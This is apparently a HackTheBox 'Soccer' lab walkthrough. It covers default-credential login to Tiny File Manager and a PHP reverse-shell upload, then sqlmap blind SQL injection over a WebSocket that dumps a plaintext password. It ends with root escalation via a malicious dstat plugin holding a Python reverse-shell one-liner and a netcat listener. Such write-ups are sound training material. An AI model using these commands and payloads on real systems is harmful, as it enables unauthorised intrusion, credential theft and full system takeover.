# HackTheBox
## Soccer

### URL: http://soccer.htb/


*Nmap* Scan

```shell 

PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp    open     http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/

9091/tcp  open     xmltec-xmlmail?


```


Found another entry using *gobuster dir*

```shell
http://soccer.htb/tiny/ // and it\'s runing Tinyfilemanager service

```

I was able to log in using `Tinyfilemanager` default cridintials

Now I can upload upload my php reverse-shell to `/tiny/uploads` because this is the only one that have write permissions

and `Boom` I got shell

found unpermmited user.txt in `/home/player/`


Found another domain in `/etc/hosts`

`soc-player.soccer.htb`


SignUp and login 

view page source in /check  and

found WebSocket request to `ws://soc-player.soccer.htb:9091`


Because *sqlmap* needs to send request and check response and websockets not offering that

I used a middlware script from https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
and changed url and data to take `{"id": msg}` 

Now I can pass this middlware server to *sqlmap* like this

```shell
sqlmap -u http://localhost:3000/?id=1 -p id --batch

Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9421 FROM (SELECT(SLEEP(5)))qoOs)


```


Now it's time to extract some creds from this database

```shell

sqlmap -u http://localhost:3000/?id=1 -p id --risk 3 --level 5  --batch -D soccer_db -T accounts --dump 


+---------+-------------------+----------------------+----------+
| id      | email             | password             | username |
+---------+-------------------+----------------------+----------+
| 1324    | player@player.htb | PlayerOftheMatch2022 | player   |
| <blank> | <blank>           | <blank>              | <blank>  |
+---------+-------------------+----------------------+----------+


```

I got this password

`PlayerOftheMatch2022`

now we can ssh to this machine as `player` user


```shell

ssh player@soc-player.soccer.htb

```
And here we are

```shell
player@soccer:~$

```


Running *Linpeas.sh* found that dstat runing as root with nopassword using doas(e.g doas is similar sudo)
```shell
╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
reading the dstat manual found that I can execute external plugins using --<plugin-name> flag

after reading `dstat` source code found that it has tow paths to access plugins from

`/usr/share/dstat/` but only root  can write here
`/usr/local/share/dstat/` so this one looks promising 


So inside of `/usr/local/share/dstat/` I created a fake plugin called `dstat_shell.py` (it should start with `dstat` prefix this is how `dstat` command can access it)

and put this python reverse shell

```py
#! /usr/bin/python3


import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",1998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")

```

And in my machine start listning on port 1998

```shell
nc -lnvp 1998
```

And in soccer machine excuted this command

```shell

doas -u root /usr/bin/dstat --shell # --shell = --<plugin-name>

```


And I got a shell

```shell

listening on [any] 1998 ...
connect to [10.10.14.161] from (UNKNOWN) [10.10.11.194] 50998
# id
id
uid=0(root) gid=0(root) groups=0(root)


```

And I'm root

I got the root flag